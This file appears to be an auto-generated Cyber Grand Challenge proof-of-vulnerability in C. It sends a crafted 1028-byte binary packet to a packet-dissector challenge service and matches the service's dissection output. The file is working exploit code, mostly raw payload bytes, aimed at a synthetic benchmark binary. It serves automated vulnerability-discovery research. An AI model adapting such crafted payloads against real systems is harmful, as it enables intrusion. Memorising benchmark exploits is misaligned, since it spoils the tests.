#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x37\x41\x70\x5f"
         "\x98\x7c\xae\x9b\x82\xd3\xc0\x7d\x4f\xba\x18\x85\x64\x54\xfd\xfc"
         "\x4e\x01\x00\x00\x02\xc5\x6e\x5d\xf1\x57\x76\xce\x8a\x5b\x9c\x12"
         "\xa1\x8c\xd2\x16\xf6\x0d\x8c\xb4\x98\x78\x82\xcc\x54\xd0\x24\x3a"
         "\x63\x2c\x3b\xaf\x3c\x72\xa4\x8d\x56\x46\x6d\x53\xed\xd9\x4a\x19"
         "\xec\xe3\x2b\x34\xce\x43\xba\x4a\x7c\xb2\x04\xe5\x36\xb8\x7c\xf7"
         "\xea\x7b\x17\xa2\x3f\xd2\x60\x1d\xa9\xf8\x35\x1c\x63\x9f\x36\x6a"
         "\xd1\x43\x78\x59\xd9\xa4\xb2\x53\x62\x23\xbd\xcf\xbc\x84\x3b\xde"
         "\xcf\xbc\xdb\xb7\x1d\xca\x22\x97\x7a\x05\xdd\x05\x22\xb4\x94\x69"
         "\x3b\x32\xb7\x7f\xf3\xe3\xc9\x7c\xbd\x67\x08\x1e\x5b\xf8\x15\xb4"
         "\xda\x82\xec\xf9\x52\x50\x22\x9d\x4d\x2f\x0c\x0b\xfc\x53\x9f\x13"
         "\x97\xd6\x6c\x43\xe9\xb2\xbd\xcd\x3c\xee\xdc\xb7\x19\xc7\x3c\xa4"
         "\x0b\x35\x5d\x93\xa1\xad\x86\xe3\x6a\xe8\x61\x36\x89\xfd\x24\x52"
         "\x34\xd0\xd8\xe4\x82\xc2\xa3\x09\xdc\x33\xdd\x67\x7d\x1c\x56\x4d"
         "\xf6\x1c\x9b\xcb\xc3\xa4\xd8\xfc\xb5\xf0\x48\xe1\xaa\x90\xaf\xd6"
         "\x98\x2f\x11\x63\x03\x02\x06\xd8\x3e\x98\x17\x2b\x1d\x26\xd7\x94"
         "\x89\x8f\x49\x9f\x46\x07\x9c\xac\x4b\x6e\x6a\x19\x0f\x00\x25\x52"
         "\x4d\xf2\x96\xdf\xb3\xae\x6c\x40\x53\xd5\x1e\xcf\x50\xc2\x5f\x1b"
         "\xdc\x0d\x7a\x69\xc8\x3e\xc6\xc7\x42\x82\xa2\x34\x75\xb4\x3a\x17"
         "\xcf\xc7\xd0\x7e\x28\x01\x17\xc1\xa1\xa8\x77\xc2\x30\xb4\xef\xaa"
         "\xe6\x91\x27\xec\xca\x21\x40\x78\x9a\xf5\xc9\xc8\x3a\x4e\x32\x8d"
         "\xc9\x91\x96\xb3\xc6\x52\x12\x5d\x49\xcc\xf6\x13\x61\x29\x8a\x57"
         "\x79\xda\x0d\x00\x0d\x14\x3e\x0f\xd5\x73\x43\xe0\xc9\x08\x3a\x82"
         "\xee\xad\x5f\xa3\x5b\x7a\x86\xd0\xe9\x0c\x75\x1b\x92\x36\x5d\xcc"
         "\x46\x0d\x23\xd1\x52\x07\x53\xc2\x7c\xf5\xb4\x84\xc4\xaf\x15\x85"
         "\x23\xb7\x85\x71\x34\xce\x42\x04\x84\x98\xac\x20\xde\x7f\x89\xf3"
         "\xa6\xfc\x47\x48\x8d\xf7\xb1\x8f\x9e\xdc\xf5\x99\x53\xaf\x59\xbf"
         "\x8b\x20\xac\xe4\x24\xd4\xd0\xc2\x6a\x8f\x88\x50\xfd\xe2\x12\xde"
         "\x0c\xad\xd5\x18\x4d\x9f\x7d\xdd\xd0\x42\x8b\x16\x85\xc2\x4c\x29"
         "\x0f\x78\x76\xdd\x0f\x3b\x6e\xf1\xcb\x2d\x5d\x30\x86\xd9\xed\xd7"
         "\xb2\xc9\x23\x63\x62\xc9\xf9\xa1\x93\x84\xda\x1b\xe1\x61\x83\xe4"
         "\x74\x6d\xa5\x8e\xed\x07\xfc\xa0\xa1\x35\xca\xd8\xe9\x76\x3e\x8d"
         "\x29\x1d\xb1\x5c\xe9\x0d\x00\xce\x4c\xa0\x22\x92\xc0\xf1\xef\x76"
         "\x29\xd3\xb9\xd2\xa9\xb5\xf4\xf1\x4d\xd7\x2e\xe4\x19\x90\x23\x02"
         "\x1a\xf6\x90\xf6\x17\x71\x71\x88\x93\xee\x4c\x07\x27\x67\x42\xd5"
         "\x1c\xad\xd2\x58\xac\xd2\x5a\x07\xe2\x3d\xfd\xe2\x36\x83\x1b\x22"
         "\xa0\x38\x95\xb1\x3d\xe9\xc2\x64\xd0\xfc\xf3\x33\x4a\x42\xa2\x24"
         "\x65\x71\xa6\x3a\x03\xe1\xb3\x59\xb6\x45\x0d\xa1\xac\xb8\xe9\x04"
         "\x05\x35\x6b\x81\x74\x3d\xd9\x42\x03\xa1\xab\xa3\xc0\xf8\x05\xaa"
         "\x81\x07\xb3\x06\xe4\xdc\x85\xdc\xa7\x35\x52\x3a\x6b\xe1\x57\x88"
         "\x02\x6f\xa4\x21\x30\x46\x46\x21\xd5\xf4\xad\xaf\x8d\x5a\x08\xfd"
         "\xc1\x67\xf6\xb8\xd0\xf1\x09\x6f\xda\xfc\x6e\x12\x56\xa7\x54\x5a"
         "\x69\x22\x8a\xf9\x2f\x00\xfb\xc3\x84\x6d\xf8\x7c\x4b\xfc\x31\xa4"
         "\x26\xfa\x03\x4a\x51\x15\x96\x65\xef\x28\x08\x87\x8d\x0e\x16\x29"
         "\x82\x22\xa7\xa5\x55\xa8\x34\x66\x85\x26\x44\x00\x52\xc4\x21\x24"
         "\xba\x47\x1b\xcb\x27\xac\x13\xa8\x5e\x86\x48\xd0\x57\x2a\x1d\x37"
         "\x4a\x4f\x27\x37\x78\xa3\xe8\xac\x2c\x9e\x4c\x9b\xbd\x67\xb0\x59"
         "\xe7\xd9\x7d\xdd\xda\x92\xb0\xb9\xaa\xdf\x7c\xd4\xdf\x81\x22\x67"
         "\x04\x78\x54\xed\xfa\x98\xfd\xa2\x52\xf3\x72\x7e\xd9\x86\xea\x0a"
         "\xca\x2b\xef\x47\x23\x2a\x12\x52\x14\xf9\xa2\x97\xbe\x72\x7f\xb6"
         "\xb2\x53\x48\xbf\x0c\x46\x0c\x17\x31\x31\x17\x6f\x2b\xaa\x74\x53"
         "\xea\xf0\x7f\x10\xb2\xaa\x9f\xf8\x98\x7b\x8b\xa0\x66\x08\xbd\xe5"
         "\x0f\xb3\xd1\xaa\xa0\x9d\xc6\x2c\x40\xcf\x70\x81\x8d\x83\xc4\xb7"
         "\xd1\x7e\xf2\x13\x4f\x9e\xfa\xd1\x31\x08\xeb\x43\xfa\x26\x4e\x42"
         "\xea\xff\x14\xcf\x81\xe0\x0c\x1b\x17\x20\x8c\xce\x42\x21\x1b\xfa"
         "\xba\x8a\xf3\xf6\x76\x2c\x05\x24\x3e\xcc\xb1\x7f\x84\x23\xa1\x48"
         "\x62\x35\x2d\xff\x6d\x0f\x26\xac\x7a\xbf\xd8\xc0\x6a\x05\x30\x81"
         "\xd2\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===symmetricalantimasker
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x79\x6d\x6d\x65\x74\x72\x69\x63\x61\x6c"
         "\x61\x6e\x74\x69\x6d\x61\x73\x6b\x65\x72";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
